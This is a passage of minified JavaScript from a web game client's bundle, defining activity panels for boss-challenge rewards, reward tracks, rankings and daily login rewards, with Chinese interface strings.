t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.ins=a.Activity.ins(),this.cfgs=s.GlobalConfig.ActivityType57Config[this.activityID],this.showfig=s.GlobalConfig.ActivityType57_1Config[this.activityID],this.listType.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.typeOnTap,this),this.listBoss.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.bossOnTap,this),this.btnChallenge.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),observe(this,this.updateData,a.Activity.ins().postActivityIsGetAwards),h.ActivityType57Data.selBossId=-1,h.ActivityType57Data.selType=-1,this._actData=this.ins.getActivityDataById(this.activityID),this.updateData()},e.prototype.typeOnTap=function(t){var e=this.listType.selectedItem;e!=h.ActivityType57Data.selType&&(h.ActivityType57Data.selType=e,h.ActivityType57Data.selBossId=-1,this.updateTabs(),this.updateBossList())},e.prototype.bossOnTap=function(t){var e=this.listBoss.selectedItem;e.cfg.bossId!=h.ActivityType57Data.selBossId&&(h.ActivityType57Data.selBossId=e.cfg.bossId,this.updateBossList())},e.prototype.updateData=function(){this.updateView()},e.prototype.updateTabs=function(){this._groupArr=[];var t;for(var e in this.cfgs)t=this.cfgs[e],this._groupArr.indexOf(t.groupType)<0&&this._groupArr.push(t.groupType);h.ActivityType57Data.selType=h.ActivityType57Data.selType<0?this._groupArr[0]:h.ActivityType57Data.selType,this.listType.selectedIndex=0,this._listTypeArr.replaceAll(this._groupArr)},e.prototype.updateBossList=function(){var t=this._actData.getBossCfgArrByGroup(h.ActivityType57Data.selType),e=[];for(var i in t)e.push({actId:this.activityID,cfg:t[i]});h.ActivityType57Data.selBossId<0&&e.length>0&&(h.ActivityType57Data.selBossId=e[0].cfg.bossId),this._listBossArr.replaceAll(e),this.flusSelView()},e.prototype.reqReward=function(t,e,i,n){var o=this.ins.getBytes(2);o.writeInt(t),o.writeInt(e),o.writeShort(i),o.writeInt(n),this.ins.sendToServer(o)},e.prototype.onTouch=function(t){switch(t.target){case this.btnChallenge:var e=s.GlobalConfig.ActivityBaseConfig.Type57Turn[h.ActivityType57Data.selType],i=this._actData.getAwardDataByGroupId(h.ActivityType57Data.selType,h.ActivityType57Data.selBossId);if(i)if(1==i.belong)this.reqReward(this.activityID,i.bossId,1);else if(1==i.all)this.reqReward(this.activityID,i.bossId,2);else if(1==i.person)this.reqReward(this.activityID,i.bossId,3);else if("MainMapBoss"==e[0]){if(3==e[1]){var o=s.GlobalConfig.CrossBossBase.woLongVilla.open;if(n.ZsCT.ins().stage<o[0]||v.GameServerCC.serverOpenDay+1<o[1])return void m.TipsCT.ins().showTips(gettext("开服{0}天{1}转可进入",o[1],o[0]))}win.close(g.FuliWin),f.MainMapBoss.selectTab=e[1],c.MainUICC.onClickMap(!0)}else 3==e.length?win.open(e[0],e[1],e[2]):2==e.length?win.open(e[0],e[1]):win.open(e[0]);break;case this.eTurn:var a=s.GlobalConfig.ActivityBaseConfig.Type57IconTurn;a[0]&&win.open.apply(win,__spreadArrays([a[0]],a.slice(1)))}},e.prototype.updateView=function(){this._actData&&(this._actData=this.ins.getActivityDataById(this.activityID),this.updateTabs(),this.updateBossList(),this.flusSelView())},e.prototype.flusSelView=function(){var t=this._actData.getBossInfoByTypeId(h.ActivityType57Data.selType,h.ActivityType57Data.selBossId);if(t){var e=this._actData.getBossCfgByGroupId(h.ActivityType57Data.selType,h.ActivityType57Data.selBossId),i=s.GlobalConfig.MonstersConfig[e.bossId];this.imgMonster.source="monhead"+i.head+"_png",this.eName.text=i.name,this.ekiller.text=t.player?t.player+"":gettext("未击杀"),this.imgRp.visible=this._actData.checkAward(h.ActivityType57Data.selType,h.ActivityType57Data.selBossId);var n=r.ActorCC.level>=e.level,o=this._actData.checkGetAward(h.ActivityType57Data.selType,h.ActivityType57Data.selBossId);this.btnChallenge.label=this.imgRp.visible?gettext("领取奖励"):o?gettext("已领取"):n?gettext("前往挑战"):gettext("未解锁"),this.btnChallenge.enabled=this.imgRp.visible||!o&&!!n;var a=e.belongReward.concat(),l=e.everyoneReward.concat(),u=e.personReward,p=this._actData.getAwardDataByGroupId(h.ActivityType57Data.selType,h.ActivityType57Data.selBossId);for(var d in a)a[d].isRedPoint=2==p.belong?2:0;for(var c in l)l[c].isRedPoint=2==p.all?2:0;for(var f in u)u[f].isRedPoint=2==p.person?2:0;this.eItem0.dataProvider=new eui.ArrayCollection(a),this.eItem1.dataProvider=new eui.ArrayCollection(l),this.eItem2.dataProvider=new eui.ArrayCollection(u)}},e.prototype.tabRp=function(){var t=a.Activity.ins().activityData[this.activityID],e=t.canReward();return e},__decorate([delayCall(100)],e.prototype,"updateData",null),e}(u.ActivityPanel);e.OSATarget57Panel=y,window.OSATarget57Panel=y,__reflect(y.prototype,"OSATarget57Panel",[]),window.OSATarget57Panel=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget58Panel=void 0;var n=i(573),o=i(24),s=i(0),a=i(9),r=i(29),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.items=[],e._sn_="ActivityFbSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.initView(),this.update(),this.eSscrollH(),this.addTouchEvent(this,this.onClick),this.addEvent(eui.UIEvent.CHANGE_END,this.eS,this.onScrollChange),this.addEvent(eui.UIEvent.CHANGE_START,this.eS,this.onScrollStart),Timer.start(300,1,this.onScrollChange,this)},e.prototype.initView=function(){if(!(this.items.length>0)){var t=s.GlobalConfig.ActivityType58Config[this.activityID];for(var e in t){var i=new n.OSATarget58Item(t[e]);this.eMCGroup.addChild(i),this.items.push(i)}}},e.prototype.eSscrollH=function(){var t=s.GlobalConfig.ActivityType58Config[this.activityID][this.data.cid+1];this.eS.viewport.scrollH=t?Math.max(0,t.showPos[0]/2):0},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:a.Activity.ins().sendReward(this.activityID,1,this.data.cid+1);break;case this.eRankBtn:win.open("OSATarget58RankWin",this.activityID);break;case this.leftBtn:this.toPageH(-1);break;case this.rightBtn:this.toPageH(1)}},e.prototype.toPageH=function(t){var e=this;void 0===t&&(t=1);var i=2300-this.eS.parent.width,n=Math.max(Math.min(this.eS.viewport.scrollH+this.eS.parent.width*t,i),0);egret.Tween.removeTweens(this.eS.viewport),egret.Tween.get(this.eS.viewport).to({scrollH:n},200).call(function(){e.eS.dispatchEventWith(eui.UIEvent.CHANGE_END)}),this.onScrollStart()},e.prototype.onScrollChange=function(){var t=2300-this.eS.parent.width;this.leftBtn.visible=0<this.eS.viewport.scrollH,this.rightBtn.visible=this.eS.viewport.scrollH<t,this.leftBtn.touchEnabled=this.rightBtn.touchEnabled=!0},e.prototype.onScrollStart=function(){this.leftBtn.touchEnabled=this.rightBtn.touchEnabled=!1},e.prototype.update=function(){this.data=a.Activity.ins().activityData[this.activityID],this.updateReward(),this.updateItems(),this.updateBtn()},e.prototype.updateBtn=function(){var t=this.data.cid>0&&!s.GlobalConfig.ActivityType58Config[this.activityID][this.data.cid+1];this.eBtn.visible=!t,this.eAlready.visible=t},e.prototype.updateItems=function(){for(var t in this.items)this.items[t].updateData(this.data)},e.prototype.updateReward=function(){var t=this.data.cid,e=s.GlobalConfig.ActivityType58Config[this.activityID][t+1],i=o.CommonUtils.getObjectLength(s.GlobalConfig.ActivityType58Config[this.activityID]),n=s.GlobalConfig.ActivityType58Config[this.activityID][i];this.eListL.dataProvider=new eui.ArrayCollection(e?e.reward:n.reward),this.eListR.dataProvider=new eui.ArrayCollection(n.reward)},__decorate([delayCall()],e.prototype,"eSscrollH",null),e}(r.ActivityPanel);e.OSATarget58Panel=l,window.OSATarget58Panel=l,__reflect(l.prototype,"OSATarget58Panel",[]),window.OSATarget58Panel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget59Panel=void 0;var n=i(29),o=i(9),s=i(0),a=i(5),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa59pskin",e.state=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.changePage,o.Activity.ins().postActivityIsGetAwards,o.Activity.ins().postChangePage),o.Activity.ins().sendChangePage(this.activityID);var i=s.GlobalConfig.ActivityConfig[this.activityID];this.eDesc.textFlow=a.TextFlowMaker.generateTextFlow1(""+i.desc),this.update(),this.state=!1},e.prototype.changePage=function(t){this.activityID==t&&this.update()},e.prototype.update=function(){this.eP1.setData(this.activityID,1,this.state),this.eP2.setData(this.activityID,2,this.state),this.eBtn.label=this.state?gettext("查看全体奖励"):gettext("查看前三奖励")},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.state=!this.state,this.update()}},e}(n.ActivityPanel);e.OSATarget59Panel=r,window.OSATarget59Panel=r,__reflect(r.prototype,"OSATarget59Panel",[]),window.OSATarget59Panel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget5Panel=void 0;var n=i(16),o=i(0),s=i(9),a=i(33),r=i(29),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this)},e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(s.Activity.ins().postActivityIsGetAwards,this.updateData),this.observe(s.Activity.ins().postChangePage,this.updateData),this.observe(s.Activity.ins().postRewardResult,this.updateData),this.initPanelList(),s.Activity.ins().sendRewardStatu(this.activityID)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),this.cruPanel&&this.cruPanel.close()},e.prototype.initPanelList=function(){var t,i=this.activityID;if(this.activityType==a.ActivityType.Normal?t=o.GlobalConfig.ActivityType5Config[i]:this.activityType==a.ActivityType.Personal&&(t=o.GlobalConfig.PActivityType5Config[i]),!this.cruPanel||this.cruPanel.activityID!=i){this.cruPanel&&(this.cruPanel.close(),n.DisplayUtils.removeFromParent(this.cruPanel));var s=e.targetIndex[i]||"OSATarget5Panel"+t[1].showType,r=egret.getDefinitionByName(s);this.cruPanel=new r(this.activityID),this.cruPanel.top=0,this.cruPanel.bottom=0,this.cruPanel.left=0,this.cruPanel.right=0,this.cruPanel.activityID=this.activityID,this.addChild(this.cruPanel)}this.cruPanel.open()},e.prototype.updateData=function(){this.cruPanel&&this.cruPanel.updateData&&this.cruPanel.updateData()},e.targetIndex={157:"OSATarget5Panel1",210:"OSATarget5Panel2"},e}(r.ActivityPanel);e.OSATarget5Panel=l,window.OSATarget5Panel=l,__reflect(l.prototype,"OSATarget5Panel",[]),window.OSATarget5Panel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityHFRenderItem=e.OSATarget5Panel1=void 0;var n=i(8),o=i(16),s=i(5),a=i(3),r=i(1),l=i(11),h=i(0),u=i(7),p=i(2),d=i(9),c=function(t){function e(){var e=t.call(this)||this;return e.itemary=[],e.dayindex=1,e.itemList=[],e.itemary=[],e}return __extends(e,t),e.prototype.initData=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.GlobalConfig.ActivityType5Config[this.activityID];this.maxNum=0,this.itemList=[];for(var n=0;7>n;n++)i[n+1]&&(this.itemList[n]=new f,this.itemList[n].touchEnabled=!1,this.maxNum++);switch(this.maxNum){case 3:for(var n=0;n<this.itemList.length;n++)this.btn0Gop.addChild(this.itemList[n]);break;case 5:for(var n=0;n<this.itemList.length;n++)this.btn0Gop.addChild(this.itemList[n]);break;case 7:for(var n=0;n<this.itemList.length;n++)this.btn0Gop.addChild(this.itemList[n])}this._activityData=d.Activity.ins().getActivityDataById(this.activityID),this.addTouchEvent(this.suerBtn,this.onTouch);for(var n=0;n<this.maxNum;n++)this.addTouchEvent(this.itemList[n],this.itemTouch);this.observe(d.Activity.ins().postActivityIsGetAwards,this.changeList),Timer.start(1e3,-1,this.setTime,this),this.updateData();var o=t[0];o&&this.setList(o);var s=d.Activity.ins().getbtnInfo(this.activityID);(null===s||void 0===s?void 0:s.titleImg)&&(this.actTitle.source=null===s||void 0===s?void 0:s.titleImg),(null===s||void 0===s?void 0:s.bgImg)&&(this.actBg.source=null===s||void 0===s?void 0:s.bgImg),(null===s||void 0===s?void 0:s.bannerImg)&&(this.acbanner.source=null===s||void 0===s?void 0:s.bannerImg)},e.prototype.removeDisplay=function(){if(this.skin){this.removeTouchEvent(this.suerBtn,this.onTouch);for(var t=0;t<this.maxNum;t++)this.removeTouchEvent(this.itemList[t],this.itemTouch);if(this.btn0Gop&&this.btn0Gop.numElements>0)for(var t=this.btn0Gop.numElements-1;t>=0;t--){var e=this.btn0Gop.getElementAt(t);e&&e.clearAll(),o.DisplayUtils.removeFromParent(e)}if(this.btn1Gop&&this.btn1Gop.numElements>0)for(var t=this.btn1Gop.numElements-1;t>=0;t--){var e=this.btn1Gop.getElementAt(t);e&&e.clearAll(),o.DisplayUtils.removeFromParent(e)}this.maxNum=0,this.removeObserve(),Timer.stopAll(this)}},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this.suerBtn,this.onTouch),o.DisplayUtils.removeFromParent(this.btnMC);for(var i=0;i<this.maxNum;i++)this.removeTouchEvent(this.itemList[i],this.itemTouch);this.removeObserve(),Timer.stopAll(this)},e.prototype.changeList=function(){var t=1,e=this._activityData.getCurDay();e||(e=t),t=e>=this.maxNum?this.maxNum:e;for(var i=1;t>=i;i++){var n=h.GlobalConfig.ActivityType5Config[this.activityID][i+""];if(n&&e>=n.day&&0==(this._activityData.recrod>>n.day&1))return void this.setList(i)}this.setList(t+1)},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.suerBtn:this._activityData.getCurDay()>=this.day?d.Activity.ins().sendReward(this.activityID,this.day):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:登陆天数不足，无法领取|"))}},e.prototype.itemTouch=function(t){this.setList(t.currentTarget.data)},e.prototype.setList=function(t){void 0===t&&(t=-1),-1==t&&(t=this.dayindex),t>this.maxNum&&(t=this.maxNum),this.dayindex=t;var e=h.GlobalConfig.ActivityType5Config[this.activityID][t+""],i=e.rewards;this.day=e.day;var n=1;n=this._activityData.getCurDay(),this.daylabel.text=gettext("登陆天数：{0}",n),this.daylabel.visible=!0;var a=1==(this._activityData.recrod>>this.day&1);this.dayaward.text=gettext("第{0}天奖励详情",s.TextFlowMaker.getCStr(t)),n>=this.day?a?(this.daylabel.visible=!1,this.suerBtn.enabled=!1,this.suerBtn.label=gettext("已领取"),this.redPoint.visible=!1):(this.suerBtn.enabled=!0,this.suerBtn.label=gettext("可领取"),this.redPoint.visible=!0):(o.DisplayUtils.removeFromParent(this.btnMC),this.suerBtn.enabled=!1,this.suerBtn.label=gettext("未达到"),this.redPoint.visible=!1),this.itemary.forEach(function(t){t.parent&&(t.parent.removeChild(t),t=null)}),this.itemary=[];for(var r=0,u=0;u<i.length;u++){var p=new l.ItemBase;this.group1.addChild(p),r++,p.data=i[u],this.itemary.push(p)}for(var u=0;u<this.maxNum;u++)this.itemList[u].activityID=this.activityID,this.itemList[u].data=u+1,u+1==t||u+1==this.maxNum&&t==this.maxNum?this.itemList[u].setSelectImg(!0):this.itemList[u].setSelectImg(!1);this.showRedPoint()},e.prototype.showRedPoint=function(){},e.prototype.updateData=function(){this.changeList(),this.showRedPoint(),this.setTime()},e.prototype.setTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.startTime)-u.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.endTime)-u.GameServerCC.serverTime)/1e3);t>=0?this.actTime.text=gettext("活动未开启"):0>=e?this.actTime.text=gettext("活动已结束"):this.actTime.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.tabRp=function(){var t=d.Activity.ins().activityData[this.activityID],e=t.canReward();return e},e}(r.BaseView);e.OSATarget5Panel1=c,window.OSATarget5Panel1=c,__reflect(c.prototype,"OSATarget5Panel1",[]);var f=function(t){function e(){var e=t.call(this)||this;return e._sn_="act14item",e}return __extends(e,t),e.prototype.dataChanged=function(){this.item.enabled=!1;var t=this.activityID,e=d.Activity.ins().getActivityDataById(t),i=this.data,n=h.GlobalConfig.ActivityType5Config[t][i+""],o=e.getCurDay(),s=1==(e.recrod>>n.day&1);s?(this.select.visible=!1,this.redPoint.visible=!1):o>=n.day?this.redPoint.visible=!0:this.redPoint.visible=!1,null!=this.bg&&(this.bg.visible=!s),null!=this.dayImg&&(this.dayImg.source=s?n.receivedimg:n.unclaimedimg),null!=this.select&&(this.select.source=s?n.choosereceivedimg:n.chooseunclaimedimg),this.item.data=n.rewards[0]},e.prototype.setSelectImg=function(t){this.skin&&(this.select.visible=t)},e.prototype.clearAll=function(){this.dayImg.source="",this.select.source="",this.checked.source=""},e}(a.BaseItemRender);e.ActivityHFRenderItem=f,window.ActivityHFRenderItem=f,__reflect(f.prototype,"ActivityHFRenderItem",[]),window.ActivityHFRenderItem=f,window.OSATarget5Panel1=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget5Panel2=void 0;var n=i(21),o=i(8),s=i(16),a=i(5),r=i(1),l=i(11),h=i(0),u=i(7),p=i(2),d=i(9),c=function(t){function e(){var e=t.call(this)||this;return e.itemary=[],e.dayindex=1,e.itemList=[],e.skinName="ganenLogSkin",e.itemary=[],e}return __extends(e,t),e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.GlobalConfig.ActivityType5Config[this.activityID];this.maxNum=0,this.itemList=[];for(var n=0;3>n;n++)this.itemList[n]=this["dayNum"+(n+1)],this.itemList[n].touchEnabled=!1,i[n+1]?(this["dayNum"+(n+1)]&&(this["dayNum"+(n+1)].visible=!0),this["imgDay"+(n+1)]&&(this["imgDay"+(n+1)].visible=!0),this["arrow"+(n+1)]&&(this["arrow"+(n+1)].visible=!0),this.maxNum++):(this["dayNum"+(n+1)]&&(this["dayNum"+(n+1)].visible=!1),this["imgDay"+(n+1)]&&(this["imgDay"+(n+1)].visible=!1),this["arrow"+(n+1)]&&(this["arrow"+(n+1)].visible=!1));this._activityData=d.Activity.ins().getActivityDataById(this.activityID),this.addTouchEvent(this.suerBtn,this.onTouch),this.addTouchEvent(this.group,this.onTouch);for(var n=0;n<this.maxNum;n++)this.addTouchEvent(this.itemList[n],this.itemTouch);this.observe(d.Activity.ins().postActivityIsGetAwards,this.changeList),Timer.start(1e3,-1,this.setTime,this),this.updateData();var o=t[0];o&&this.setList(o)},e.prototype.setTime=function(){var t=Math.floor((o.DateUtils.formatMiniDateTime(this._activityData.startTime)-u.GameServerCC.serverTime)/1e3),e=Math.floor((o.DateUtils.formatMiniDateTime(this._activityData.endTime)-u.GameServerCC.serverTime)/1e3);t>=0?this.actTime.text=gettext("活动未开启"):0>=e?this.actTime.text=gettext("活动已结束"):this.actTime.text=o.DateUtils.getFormatBySecond(e,o.DateUtils.TIME_FORMAT_5,3)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this.suerBtn,this.onTouch),this.removeTouchEvent(this.group,this.onTouch),s.DisplayUtils.removeFromParent(this.btnMC);for(var i=0;i<this.maxNum;i++)this.removeTouchEvent(this.itemList[i],this.itemTouch);this.removeObserve(),Timer.stopAll(this)},e.prototype.changeList=function(){var t=1,e=this._activityData.getCurDay();e||(e=t),t=e>=this.maxNum?this.maxNum:e;for(var i=1;t>=i;i++){var n=h.GlobalConfig.ActivityType5Config[this.activityID][i+""];if(n&&e>=n.day&&0==(this._activityData.recrod>>n.day&1))return void this.setList(i)}this.setList(t+1)},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.group:this.setList(this.group.getChildIndex(t.target));break;case this.suerBtn:this._activityData.getCurDay()>=this.day?d.Activity.ins().sendReward(this.activityID,this.day):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:登陆天数不足，无法领取|"))}},e.prototype.itemTouch=function(t){this.setList(t.currentTarget.data)},e.prototype.setList=function(t){void 0===t&&(t=-1),-1==t&&(t=this.dayindex),t>this.maxNum&&(t=this.maxNum),this.dayindex=t;var e=h.GlobalConfig.ActivityType5Config[this.activityID][t+""],i=e.rewards;this.day=e.day;var o=1;o=this._activityData.getCurDay(),this.daylabel.text=gettext("登陆天数：{0}",o),this.daylabel.visible=!0;var r=1==(this._activityData.recrod>>this.day&1);this.dayaward.text=gettext("第{0}天奖励详情",a.TextFlowMaker.getCStr(t)),this.suerBtn.visible=!0,o>=this.day?r?(this.daylabel.visible=!1,this.suerBtn.visible=!1,this.redPoint.visible=!1):(this.btnMC=this.btnMC||new n.MovieClip,this.btnMC.x=this.suerBtn.width/2,this.btnMC.y=this.suerBtn.height/2,this.btnMC.playFile(RES_DIR_EFF+"BtnPrompt1",-1),this.suerBtn.addChild(this.btnMC),this.redPoint.visible=!0):(s.DisplayUtils.removeFromParent(this.btnMC),this.suerBtn.visible=!1,this.redPoint.visible=!1),this.itemary.forEach(function(t){t.parent&&(t.parent.removeChild(t),t=null)}),this.itemary=[];for(var u=0;u<i.length;u++){var p=new l.ItemBase;this.group1.addChild(p),p.data=i[u],this.itemary.push(p)}for(var u=0;u<this.maxNum;u++)this.itemList[u].activityID=this.activityID,this.itemList[u].data=u+1,u+1==t||u+1==this.maxNum&&t==this.maxNum?this.itemList[u].setSelectImg(!0):this.itemList[u].setSelectImg(!1);this.showRedPoint()},e.prototype.showRedPoint=function(){},e.prototype.updateData=function(){this.changeList(),this.showRedPoint(),this.setTime()},e}(r.BaseView);e.OSATarget5Panel2=c,window.OSATarget5Panel2=c,__reflect(c.prototype,"OSATarget5Panel2",[]),window.OSATarget5Panel2=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget5Panel3=void 0;var n=i(21),o=i(8),s=i(16),a=i(5),r=i(1),l=i(11),h=i(0),u=i(7),p=i(2),d=i(9),c=function(t){function e(){var e=t.call(this)||this;return e.itemary=[],e.itemList=[],e.dayindex=1,e}return __extends(e,t),Object.defineProperty(e.prototype,"activityID",{get:function(){return this._activityID},set:function(t){this._activityID=t,this.setCurSkin()},enumerable:!1,configurable:!0}),e.prototype.setCurSkin=function(){var t=h.GlobalConfig.ActivityConfig[this.activityID];t.pageSkin?this.skinName=t.pageSkin:this.skinName="NYLogSkin"},e.prototype.setItemList=function(){var t=h.GlobalConfig.ActivityType5Config[this.activityID];this.actInfo1.text=h.GlobalConfig.ActivityConfig[this.activityID].desc,this.itemList=[],this.maxNum=Object.keys(t).length;for(var e=0;e<this.maxNum;e++)this.itemList[e]=this["dayNum"+(e+1)],this.addTouchEvent(this.itemList[e],this.itemTouch),this.itemList[e].item.hideName()},e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.setCurSkin(),this.setItemList(),this._activityData=d.Activity.ins().getActivityDataById(this.activityID),this.addTouchEvent(this.suerBtn,this.onTouch),this.observe(d.Activity.ins().postActivityIsGetAwards,this.changeList),Timer.start(1e3,-1,this.setTime,this),this.updateData();var i=t[0];i&&this.setList(i)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];s.DisplayUtils.removeFromParent(this.btnMC),this.itemList.length=0,this.removeObserve(),Timer.stopAll(this)},e.prototype.changeList=function(){var t=1,e=this._activityData.getCurDay();e||(e=t),t=e>=this.maxNum?this.maxNum:e;for(var i=1;t>=i;i++){var n=h.GlobalConfig.ActivityType5Config[this.activityID][i+""];if(e>=n.day&&0==(this._activityData.recrod>>n.day&1))return void this.setList(i)}this.setList(t+1)},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.suerBtn:this._activityData.getCurDay()>=this.day?d.Activity.ins().sendReward(this.activityID,this.day):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:登陆天数不足，无法领取|"))}},e.prototype.itemTouch=function(t){this.setList(t.currentTarget.data)},e.prototype.setList=function(t){void 0===t&&(t=-1),-1==t&&(t=this.dayindex),t>this.maxNum&&(t=this.maxNum),this.dayindex=t;var e=h.GlobalConfig.ActivityType5Config[this.activityID][t+""],i=e.rewards;this.day=e.day;var o=1;o=this._activityData.getCurDay(),this.daylabel.text=gettext("登陆天数：{0}",o);var r=1==(this._activityData.recrod>>this.day&1);this.dayaward.text=gettext("第{0}天奖励详情",a.TextFlowMaker.getCStr(t)),this.suerBtn.visible=!0,this.done.visible=!1,o>=this.day?r?(this.suerBtn.visible=!1,this.redPoint.visible=!1,this.done.visible=!0):(this.btnMC=this.btnMC||new n.MovieClip,this.btnMC.x=this.suerBtn.width/2,this.btnMC.y=this.suerBtn.height/2,this.btnMC.playFile(RES_DIR_EFF+"BtnPrompt1",-1),this.suerBtn.addChild(this.btnMC),this.redPoint.visible=!0):(s.DisplayUtils.removeFromParent(this.btnMC),this.suerBtn.visible=!1,this.redPoint.visible=!1),this.itemary.forEach(function(t){t.parent&&(t.parent.removeChild(t),t=null)}),this.itemary=[];for(var u=0;u<i.length;u++){var p=new l.ItemBase;this.group1.addChild(p),p.data=i[u],this.itemary.push(p)}this.itemList.length||this.setItemList();for(var u=0;u<this.maxNum;u++)this.itemList[u].activityID=this.activityID,this.itemList[u].data=u+1,u+1==t||u+1==this.maxNum&&t==this.maxNum?this.itemList[u].setSelectImg(!0):this.itemList[u].setSelectImg(!1)},e.prototype.updateData=function(){this.changeList(),this.setTime()},e.prototype.setTime=function(){var t=Math.floor((o.DateUtils.formatMiniDateTime(this._activityData.startTime)-u.GameServerCC.serverTime)/1e3),e=Math.floor((o.DateUtils.formatMiniDateTime(this._activityData.endTime)-u.GameServerCC.serverTime)/1e3);t>=0?this.actTime1.text=gettext("活动未开启"):0>=e?this.actTime1.text=gettext("活动已结束"):this.actTime1.text=o.DateUtils.getFormatBySecond(e,o.DateUtils.TIME_FORMAT_5,3)},e}(r.BaseView);e.OSATarget5Panel3=c,window.OSATarget5Panel3=c,__reflect(c.prototype,"OSATarget5Panel3",[]),window.OSATarget5Panel3=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget5Panel4=void 0;var n=i(1),o=i(11),s=i(0),a=i(9),r=i(33),l=i(29),h=i(575),u=function(t){function e(e){var i=t.call(this)||this;return i.skinName="CDHuiGuiLogSkin",i.eRewardList.itemRenderer=o.ItemBase,i.eList.itemRenderer=h.OSATarget5Panel4Item,i.dataDP=new eui.ArrayCollection,i.eList.dataProvider=i.dataDP,i.eList.selectedIndex=0,i.activityID=e,i.addTouchEvent(i.suerBtn,i.onClick),i}return __extends(e,t),e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actType=l.ActivityPanel.getActivityTypeFromId(this.activityID),this.actType==r.ActivityType.Normal?(this.ins=a.Activity.ins(),this.cfgs=s.GlobalConfig.ActivityType5Config[this.activityID]):this.actType==r.ActivityType.Personal,this.observe(this.ins.postActivityIsGetAwards,this.update),this.eList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onListChange,this),this.update(),this.updateUI(),this.setTime(),this.setSelectId(1)},e.prototype.onListChange=function(t){this.setSelectId(t.itemIndex+1)},e.prototype.onClick=function(t){this.ins.sendReward(this.activityID,this.curSelectDay)},e.prototype.update=function(){this.data=this.ins.activityData[this.activityID],this.updateList(),this.daylabel.text=gettext("累计登陆天数:{0}",this.data.getCurDay()),this.updateBtn()},e.prototype.setSelectId=function(t){this.curSelectDay!=t&&(this.curSelectDay=t,this.eRewardList.dataProvider=new eui.ArrayCollection(this.cfgs[t].rewards),this.zhanshi.source=this.cfgs[t].img||"",this.updateBtn())},e.prototype.updateBtn=function(){var t=this.data.getRewardState(this.curSelectDay);switch(t){case 1:this.suerBtn.visible=!0,this.suerBtn.enabled=!0;break;case 2:this.suerBtn.visible=!1;break;default:this.suerBtn.visible=!0,this.suerBtn.enabled=!1}this.done.visible=!this.suerBtn.visible},e.prototype.updateList=function(){var t=[];for(var e in this.cfgs)t.push([this.cfgs[e],this.data]);this.dataDP.replaceAll(t)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve()},e.prototype.updateUI=function(){this.actType==r.ActivityType.Normal&&(this.title.source=s.GlobalConfig.ActivityBtnConfig[this.activityID].title,this.actInfo.text=s.GlobalConfig.ActivityConfig[this.activityID].desc)},e.prototype.setTime=function(){this.data&&(this.actTime.text=this.data.getRemainTime())},e}(n.BaseView);e.OSATarget5Panel4=u,window.OSATarget5Panel4=u,__reflect(u.prototype,"OSATarget5Panel4",[]),window.OSATarget5Panel4=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget5Panel5=void 0;var n=i(8),o=i(11),s=i(0),a=i(7),r=i(2),l=i(9),h=i(29),u=function(t){function e(){var e=t.call(this)||this;return e.maxDay=7,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t,e,i=[],n=0;n<arguments.length;n++)i[n]=arguments[n];this.maxDay=7,this.observe(l.Activity.ins().postActivityIsGetAwards,this.updateData);var a=s.GlobalConfig.ActivityType5Config[this.activityID];if(this.actInfo0.text=(null===(t=s.GlobalConfig.ActivityConfig[this.activityID])||void 0===t?void 0:t.desc)||"",this._activityData=l.Activity.ins().getActivityDataById(this.activityID),a)for(var r=1;r<=this.maxDay;r++)this["list"+r].itemRenderer=o.ItemBase,this["list"+r].dataProvider=new 